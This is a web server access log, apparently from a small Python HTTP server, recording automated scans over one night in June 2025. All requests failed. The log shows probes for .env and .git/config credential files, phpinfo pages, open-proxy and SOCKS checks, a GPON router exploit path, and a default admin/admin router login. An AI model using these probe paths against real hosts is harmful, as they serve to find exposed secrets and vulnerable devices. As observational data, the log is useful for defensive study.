+185.218.84.178 - - [26/Jun/2025 14:29:01] "GET / HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 14:30:04] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 14:30:05] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 14:30:05] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 14:30:06] "CONNECT example.com:443 HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 14:38:26] "GET /developmentserver/metadatauploader HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:40:25] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 15:04:37] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 15:05:18] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 15:11:54] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 15:12:28] "GET /favicon.ico HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 15:37:58] "GET / HTTP/1.1" 404 -
+204.76.203.212 - - [26/Jun/2025 15:38:41] "GET / HTTP/1.1" 404 -
+141.98.10.162 - - [26/Jun/2025 15:47:16] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 16:15:01] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 16:15:02] "POST / HTTP/1.0" 404 -
+207.167.67.206 - - [26/Jun/2025 16:24:58] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 16:24:58] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 16:24:59] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 16:24:59] "CONNECT example.com:443 HTTP/1.1" 404 -
+185.218.84.40 - - [26/Jun/2025 16:34:18] "GET / HTTP/1.1" 404 -
+141.76.94.18 - - [26/Jun/2025 16:40:23] code 400, message Bad request version ('À\x13À')
+141.76.94.18 - - [26/Jun/2025 16:40:23] "\x16\x03\x01\x00â\x01\x00\x00Þ\x03\x03ÊGó¼r\x1fÐ\x12\x11h\x9a§\x05±øóhasA(NmMf~­í¯EêÑ Ï¢mõ%Æ(\x15gXø«Ú)®GèW×\x83w­÷\x06Ê¶Ë\x1d\x9fÿ\x1eï\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+141.76.94.18 - - [26/Jun/2025 16:40:25] code 400, message Bad request version ('À\x13À')
+141.76.94.18 - - [26/Jun/2025 16:40:25] "\x16\x03\x01\x00â\x01\x00\x00Þ\x03\x03\x11µ¬N&P`\x85Ük\x8b`-%Oó5\x1bXJ×®y¢,Ím\x14Áþm! ûð\x10\x09ý|\x8c\x81ä\x1aFÐº±zîê]ôÔ²û\x1b,]²\x05SUÏ¦Õ\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+141.76.94.18 - - [26/Jun/2025 16:40:25] "GET http://141.76.94.18:80/pscan HTTP/1.1" 404 -
+141.76.94.18 - - [26/Jun/2025 16:40:27] "CONNECT p-scanner.research.netd.cs.tu-dresden.de:443 HTTP/1.1" 404 -
+185.218.84.178 - - [26/Jun/2025 16:44:31] "GET / HTTP/1.1" 404 -
+45.131.155.254 - - [26/Jun/2025 16:51:55] code 400, message Bad request version ('À\x13À')
+45.131.155.254 - - [26/Jun/2025 16:51:55] "\x16\x03\x01\x00â\x01\x00\x00Þ\x03\x03\x02\x09ÀU\x03»ÍÇ\x85Ôç`£c\x1fç\x14°\x81Á"^Ñý\x8d\x7fL#nÂ%\x1d ß¾\x82Uõv\x0bÓqàRör!®\x95^>\x98*8\x19hof¿HM+Ê\x7fr\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+204.76.203.212 - - [26/Jun/2025 16:52:05] "GET / HTTP/1.1" 404 -
+45.131.155.254 - - [26/Jun/2025 16:52:15] code 400, message Bad request version ('À\x13À')
+45.131.155.254 - - [26/Jun/2025 16:52:15] "\x16\x03\x01\x00â\x01\x00\x00Þ\x03\x03ß¶1!Ç§\x1d\x14q_¨D\x7fø\x91ÿNÏÛûÛ\x0bØ³\x1b6¿næ íô nËÖ®¹E\x1aö\x06V?=z\x1eoKVÛ¤*H:Âo¾\x9eÚ¯r§ÔE\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [26/Jun/2025 16:52:21] code 400, message Bad request version ('À\x13À')
+45.131.155.254 - - [26/Jun/2025 16:52:21] "\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03L{¤tiÄº;üþ\x9b\x88]åÆ\x92´\x80ìõß\x0cß¬Q\x97M\x96\x12î L Õ\x80ÂÈP\x8bõ;èI¡Û\x15¸ÄØ\x05vu\x88\x07\x04Ë\x93Dk~Cf\x07ô\x09\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [26/Jun/2025 16:52:40] code 400, message Bad request syntax ('CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00¼±§±host::\x00')
+45.131.155.254 - - [26/Jun/2025 16:52:40] "CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00¼±§±host::\x00" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [26/Jun/2025 16:52:47] code 400, message Bad request version ('Ê©\x03\x00\x07default\x00')
+45.131.155.254 - - [26/Jun/2025 16:52:47] "\x00\x11Clickhouse client\x18\x0cÊ©\x03\x00\x07default\x00" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [26/Jun/2025 16:52:52] code 400, message Bad HTTP/0.9 request type ('\x00')
+45.131.155.254 - - [26/Jun/2025 16:52:52] "\x00\x1e««\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03" HTTPStatus.BAD_REQUEST -
+87.121.84.16 - - [26/Jun/2025 17:24:18] "GET http://ip-api.com/json/ HTTP/1.1" 404 -
+87.121.84.16 - - [26/Jun/2025 17:34:24] code 400, message Bad request syntax ('\x05\x01\x00')
+87.121.84.16 - - [26/Jun/2025 17:34:24] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+87.121.84.16 - - [26/Jun/2025 17:34:26] code 400, message Bad request syntax ('\x04\x01\x00PÐ_p\x01\x00')
+87.121.84.16 - - [26/Jun/2025 17:34:26] "\x04\x01\x00PÐ_p\x01\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Jun/2025 17:47:56] "GET /login HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 17:57:39] "GET / HTTP/1.1" 404 -
+204.76.203.212 - - [26/Jun/2025 18:14:13] "GET / HTTP/1.1" 404 -
+204.76.203.206 - - [26/Jun/2025 18:29:27] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 18:34:52] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 18:42:03] "GET / HTTP/1.0" 404 -
+185.242.226.25 - - [26/Jun/2025 18:42:49] "GET / HTTP/1.1" 404 -
+185.242.226.25 - - [26/Jun/2025 18:43:25] code 400, message Bad request syntax ('\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03\x95\x9eöK7£X\x8eõÿR\x18ûQ\x88p\x89\x01\x98Å£\x95Æe0TÈ]5ÔYs\x00\x00rÀ0À,À(À$À\x14À')
+185.242.226.25 - - [26/Jun/2025 18:43:25] "\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03\x95\x9eöK7£X\x8eõÿR\x18ûQ\x88p\x89\x01\x98Å£\x95Æe0TÈ]5ÔYs\x00\x00rÀ0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+176.65.149.165 - - [26/Jun/2025 18:55:53] "CONNECT google.com:443 HTTP/1.1" 404 -
+185.218.84.178 - - [26/Jun/2025 19:09:47] "GET / HTTP/1.1" 404 -
+87.236.176.27 - - [26/Jun/2025 19:09:57] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 19:10:39] "GET / HTTP/1.0" 404 -
+46.19.141.90 - - [26/Jun/2025 19:11:58] "CONNECT google.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 19:14:22] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 19:14:22] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 19:14:23] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 19:14:23] "CONNECT example.com:443 HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 19:14:38] "GET / HTTP/1.0" 404 -
+5.101.64.6 - - [26/Jun/2025 19:18:27] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+5.101.64.6 - - [26/Jun/2025 19:18:27] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" HTTPStatus.BAD_REQUEST -
+204.76.203.212 - - [26/Jun/2025 19:38:49] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 19:40:08] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:17] "GET /_profiler/phpinfo HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:17] "GET /_profiler/phpinfo.php HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:18] "GET /phpinfo HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:18] "GET /phpinfo.php HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:18] "GET /info HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:18] "GET /info.php HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:19] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:19] "GET /app/.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:19] "GET /.env.bak HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:20] "GET /.env.example HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:20] "GET /.env.local HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:20] "GET /.env.old HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:20] "GET /.env.prod HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:21] "GET /.env.production.local HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:21] "GET /.env.stage HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:21] "GET /admin/.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:21] "GET /api/.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:22] "GET /apps/.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 19:42:22] "GET /.git/config HTTP/1.0" 404 -
+137.184.10.142 - - [26/Jun/2025 19:44:14] code 400, message Bad request version ('À\x14À')
+137.184.10.142 - - [26/Jun/2025 19:44:14] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03e\x90\x9f§ \x96 v\x9eÓDù§(\x02"_\x9dá[÷#æ0=j\x02\x07Â\x9f»o\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+137.184.10.142 - - [26/Jun/2025 19:44:15] "GET /get.php HTTP/1.1" 404 -
+137.184.10.142 - - [26/Jun/2025 19:44:15] code 400, message Bad request version ('àîO©P\x96\x97')
+137.184.10.142 - - [26/Jun/2025 19:44:15] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x0cE:\x9a àîO©P\x96\x97" HTTPStatus.BAD_REQUEST -
+137.184.10.142 - - [26/Jun/2025 19:44:15] code 400, message Bad request version ('À\x14À')
+137.184.10.142 - - [26/Jun/2025 19:44:15] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03î\x87þÙWEÏ\x00è\x19ú=\x1fo\x8eýéF\x9f»^\x11\x9c/ê\x85ÑUhñ;¥\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+137.184.10.142 - - [26/Jun/2025 19:44:16] code 400, message Bad request version ('À\x14À')
+137.184.10.142 - - [26/Jun/2025 19:44:16] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03äL\x10îNÂ!øî³U\\\x9b¿`\x01}®ÄG\x19¡vÎ\x1eP\x11}ãQ\x96p\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+198.235.24.120 - - [26/Jun/2025 20:05:37] "GET / HTTP/1.1" 404 -
+45.230.66.125 - - [26/Jun/2025 20:06:10] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+185.218.84.178 - - [26/Jun/2025 20:16:47] "GET / HTTP/1.1" 404 -
+185.169.4.150 - - [26/Jun/2025 20:45:43] "GET / HTTP/1.1" 404 -
+87.121.84.16 - - [26/Jun/2025 20:52:23] "GET http://ip-api.com/json/ HTTP/1.1" 404 -
+204.76.203.212 - - [26/Jun/2025 20:57:20] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 21:01:00] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:41] "GET /dns-query?dns=oF4BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:41] "POST /dns-query HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:41] "GET /dns-query?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:41] "GET /dns-query?dns=5gMBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:42] "POST /dns-query HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:42] "GET /dns-query?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:42] "GET /query?dns=m4UBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:42] "POST /query HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:42] "GET /query?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:43] "GET /query?dns=iToBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:43] "POST /query HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:43] "GET /query?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:43] "GET /resolve?dns=yJ4BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:43] "POST /resolve HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:44] "GET /resolve?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:44] "GET /resolve?dns=M84BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:44] "POST /resolve HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:44] "GET /resolve?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:44] "GET /?dns=KfMBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:45] "POST / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:45] "GET /?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:45] "GET /?dns=VWwBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:45] "POST / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:10:45] "GET /?name=example.com&type=A HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:19] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:20] "POST /sdk HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:20] "GET /odinhttpcall1750972519 HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:21] "GET /evox/about HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:21] "GET /HNAP1 HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:22] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:23] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:24] "POST / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:25] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:15:25] "GET /favicon.ico HTTP/1.0" 404 -
+87.121.84.16 - - [26/Jun/2025 21:21:58] code 400, message Bad request syntax ('\x04\x01\x00PÐ_p\x01\x00')
+87.121.84.16 - - [26/Jun/2025 21:21:58] "\x04\x01\x00PÐ_p\x01\x00" HTTPStatus.BAD_REQUEST -
+87.121.84.16 - - [26/Jun/2025 21:21:59] code 400, message Bad request syntax ('\x05\x01\x00')
+87.121.84.16 - - [26/Jun/2025 21:21:59] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Jun/2025 21:22:07] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 -
+185.218.84.45 - - [26/Jun/2025 21:27:37] "GET / HTTP/1.1" 404 -
+185.218.84.178 - - [26/Jun/2025 21:29:03] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 21:47:27] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:47:28] "POST / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:47:39] "GET /_profiler/phpinfo HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:01] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:03] "GET /admin/.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:04] "GET /api/.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:05] "GET /login/.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:07] "GET /static../.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:08] "GET /config/.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 21:57:09] "GET /data/.git/config HTTP/1.0" 404 -
+198.235.24.153 - - [26/Jun/2025 22:14:33] "GET / HTTP/1.1" 404 -
+204.76.203.212 - - [26/Jun/2025 22:18:11] "GET / HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 22:22:21] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 22:22:21] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 22:22:22] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 22:22:22] "CONNECT example.com:443 HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 22:25:33] "GET / HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 22:43:36] "GET / HTTP/1.1" 404 -
+198.235.24.18 - - [26/Jun/2025 22:48:13] code 400, message Bad request version ('À\x13À')
+198.235.24.18 - - [26/Jun/2025 22:48:13] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Q\x88\x90\x1d\x98\x1fýöî£\x94î"{\x15"Tä\x96äôxl\x04I\x1a\x92a88²[ c@æhè\x0c­\x17Ñ*\x1f\x90Ô0n\x0bJv÷%dgíì\x9d\x8aþò\x03£\x1f+\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.18 - - [26/Jun/2025 22:48:13] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.18 - - [26/Jun/2025 22:48:13] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03,\x00IT1#$±ò\x01\x8bâò\x95\x9eÙU\x00.yø\\\x1c^F¿($\x94ó\x10l\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Jun/2025 22:58:04] "GET / HTTP/1.0" 404 -
+199.45.155.95 - - [26/Jun/2025 22:58:07] "GET / HTTP/1.1" 404 -
+199.45.155.95 - - [26/Jun/2025 22:58:11] "GET / HTTP/1.1" 404 -
+199.45.155.95 - - [26/Jun/2025 22:58:11] code 505, message Invalid HTTP version (2.0)
+199.45.155.95 - - [26/Jun/2025 22:58:11] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+199.45.155.95 - - [26/Jun/2025 22:58:15] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.155.95 - - [26/Jun/2025 22:58:15] code 505, message Invalid HTTP version (2.0)
+199.45.155.95 - - [26/Jun/2025 22:58:15] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+199.45.155.95 - - [26/Jun/2025 22:58:20] code 400, message Bad request version ('À\x14À')
+199.45.155.95 - - [26/Jun/2025 22:58:20] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x036F¡\x08\x94AjÚ\x14\x9fä;ûÃ\x94\x17é¹Hû>Ó\x88Üj²\x1föÃ³Í+ ¯\x84\x9b#­.\x98þ§]§ºb\x9cÔ\x1b\x9e­G¼Qå\x9anSq¬2\x81\x8a\x09®\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+199.45.155.95 - - [26/Jun/2025 22:58:21] "GET /wiki HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 22:58:26] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 22:58:33] "GET /.well-known/security.txt HTTP/1.0" 404 -
+185.218.84.40 - - [26/Jun/2025 23:04:22] "GET / HTTP/1.1" 404 -
+205.210.31.210 - - [26/Jun/2025 23:09:32] "GET / HTTP/1.0" 404 -
+204.76.203.206 - - [26/Jun/2025 23:10:12] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 23:19:19] "GET /actuator/gateway/routes HTTP/1.0" 404 -
+205.210.31.148 - - [26/Jun/2025 23:21:27] "GET / HTTP/1.0" 404 -
+66.63.187.21 - - [26/Jun/2025 23:28:18] code 400, message Bad request syntax ('\x05\x01\x00')
+66.63.187.21 - - [26/Jun/2025 23:28:18] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Jun/2025 23:31:01] "GET / HTTP/1.0" 404 -
+204.76.203.212 - - [26/Jun/2025 23:37:50] "GET / HTTP/1.1" 404 -
+103.186.101.248 - - [26/Jun/2025 23:39:10] "CONNECT google.com:443 HTTP/1.1" 404 -
+206.168.34.70 - - [26/Jun/2025 23:40:56] code 400, message Bad request version ('À\x14À')
+206.168.34.70 - - [26/Jun/2025 23:40:56] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03SÕ 8N\x8bAFÞÄ\x9eÊÛ>)! ÊÚá±\x1fj\x80\x8bt\x84\x91Ð\x1eËq SZJ)]\x86\x80\x96\x13\x1bc\x80\x87h\x98èÅB\x98QL=gTVÇÊF\\\x06/\x13\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.34.70 - - [26/Jun/2025 23:41:41] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+206.168.34.70 - - [26/Jun/2025 23:41:41] "ZG\x00\x00\x00\x05\x00+\x0e\x01\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Jun/2025 23:47:24] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 23:47:41] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 23:47:48] "GET /security.txt HTTP/1.0" 404 -
+103.42.243.6 - - [26/Jun/2025 23:54:53] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 23:54:56] "GET / HTTP/1.1" 404 -
+107.174.224.18 - - [27/Jun/2025 00:04:09] "GET / HTTP/1.1" 404 -
+35.93.4.1 - - [27/Jun/2025 00:17:18] "GET / HTTP/1.1" 404 -
+185.218.84.45 - - [27/Jun/2025 00:40:09] "GET / HTTP/1.1" 404 -
+204.76.203.212 - - [27/Jun/2025 00:57:43] "GET / HTTP/1.1" 404 -
+185.218.84.178 - - [27/Jun/2025 01:03:41] "GET / HTTP/1.1" 404 -
+167.94.146.50 - - [27/Jun/2025 01:08:27] "GET / HTTP/1.1" 404 -
+167.94.146.50 - - [27/Jun/2025 01:08:31] "GET / HTTP/1.1" 404 -
+167.94.146.50 - - [27/Jun/2025 01:08:32] code 505, message Invalid HTTP version (2.0)
+167.94.146.50 - - [27/Jun/2025 01:08:32] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.146.50 - - [27/Jun/2025 01:08:36] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.50 - - [27/Jun/2025 01:08:36] code 505, message Invalid HTTP version (2.0)
+167.94.146.50 - - [27/Jun/2025 01:08:36] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.146.50 - - [27/Jun/2025 01:08:40] code 400, message Bad request version ('À\x14À')
+167.94.146.50 - - [27/Jun/2025 01:08:40] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03°âp<\x9béñÏ\x99BY åW:f±U´á\x9d¹\x16GP7AòObt« ó\x0f\x1e\x93¦|Ûj\x87B\x15\x14¹ó#Öó\x12[\x00\x17^»!æÜ·\x82AæH\x87\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.146.50 - - [27/Jun/2025 01:08:41] "GET /login HTTP/1.1" 404 -
+3.130.96.91 - - [27/Jun/2025 01:18:14] "GET / HTTP/1.1" 404 -
+3.130.96.91 - - [27/Jun/2025 01:20:32] "GET / HTTP/1.1" 404 -
+3.130.96.91 - - [27/Jun/2025 01:22:46] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x86ßb¬ð\x986')
+3.130.96.91 - - [27/Jun/2025 01:22:46] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x86ßb¬ð\x986\x0bqM9\x87$\x10äðVÃ¿\x9dK\x171S!\x9ci=îê" HTTPStatus.BAD_REQUEST -
+3.130.96.91 - - [27/Jun/2025 01:25:17] code 400, message Bad request version ('À\x14À')
+3.130.96.91 - - [27/Jun/2025 01:25:17] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03"\x80\x9f\x88\x8c\x07íÐ½\x80\x0bÖI?ü\x07GÛ2U@¿\x89\x9b\x12m\x80a\x942¼\x03\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+207.167.67.206 - - [27/Jun/2025 01:25:35] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 01:25:36] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 01:25:36] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 01:25:36] "CONNECT example.com:443 HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 01:29:48] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 01:33:40] "GET /webui/ HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 01:36:39] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 01:38:05] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 01:45:55] "GET /geoserver/web/ HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 01:49:01] "GET /.git/config HTTP/1.0" 404 -
+185.218.84.40 - - [27/Jun/2025 01:52:37] "GET / HTTP/1.1" 404 -
